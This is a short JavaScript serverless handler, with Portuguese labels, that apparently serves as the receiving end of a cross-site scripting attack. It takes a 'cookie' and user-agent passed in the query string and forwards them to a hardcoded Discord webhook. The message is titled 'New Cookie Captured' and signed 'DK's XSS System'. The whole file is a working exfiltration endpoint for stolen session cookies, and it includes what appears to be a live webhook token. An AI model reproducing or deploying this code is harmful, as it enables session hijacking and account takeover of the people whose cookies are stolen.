export default async function handler(req, res) {
  const { cookie = "sem cookie", userAgent = "desconhecido" } = req.query;
  const webhook = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title: "Novo Cookie Capturado",
        color: 0xff0000,
        fields: [
          { name: "Cookie", value: "```" + cookie + "```" },
          { name: "User-Agent", value: userAgent }
        ],
        footer: { text: "Sistema XSS do DK" }
      }]
    })
  });

  res.status(200).send("OK");
}
